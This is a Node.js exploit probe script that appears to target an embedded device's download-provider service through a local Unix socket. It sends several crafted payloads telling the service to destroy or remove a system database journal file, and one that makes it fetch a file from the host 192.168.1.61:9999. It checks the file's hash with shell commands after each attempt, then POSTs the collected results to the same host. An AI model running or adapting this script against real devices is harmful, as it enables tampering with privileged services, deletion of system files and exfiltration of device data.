"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var net = require('net');
var HOST='192.168.1.61', PORT=9999;
var R={ts:new Date().toISOString(), probe:'p115', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,500));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},3000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p115info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||3000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function md5(p){return run('md5sum '+p+' 2>&1; ls -la '+p+' 2>&1',15000,1000);}
function sockSend(payload, timeout){
  return new Promise(function(resolve){
    var s=net.connect('/tmp/.download-provider.sock');
    var out='';
    s.setTimeout(timeout||4000,function(){s.destroy();resolve('TIMEOUT '+out);});
    s.on('connect',function(){s.write(payload);});
    s.on('data',function(d){out+=d.toString();});
    s.on('error',function(e){resolve('ERR '+e.message+' '+out);});
    s.on('close',function(){resolve(out);});
  });
}
function main(){
  var J='/opt/dbspace/.app-context.db-journal';
  R.results.jrn0=md5(J);
  var variants=[
    'DESTROY\n/opt/dbspace/.app-context.db-journal\n',
    'FILENAME\n/opt/dbspace/.app-context.db-journal\nDESTROY\n',
    'START\nhttp://192.168.1.61:9999/appctx_hot_journal_launcher\n/opt/dbspace\n.app-context.db-journal\n',
    '{"command":"remove","filename":"/opt/dbspace/.app-context.db-journal"}\n',
    '{"op":"destroy","filename":"/opt/dbspace/.app-context.db-journal"}\n'
  ];
  (async function(){
    for(var i=0;i<variants.length;i++){
      R.results['sock'+i]=await sockSend(variants[i],4000);
      R.results['jrn'+(i+1)]=md5(J);
    }
    R.results.final='done '+new Date().toISOString();
    L('done');
    postFinal();
    setTimeout(postFinal,20000);
  })().catch(function(e){R.results.fatal=String(e);postFinal();});
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
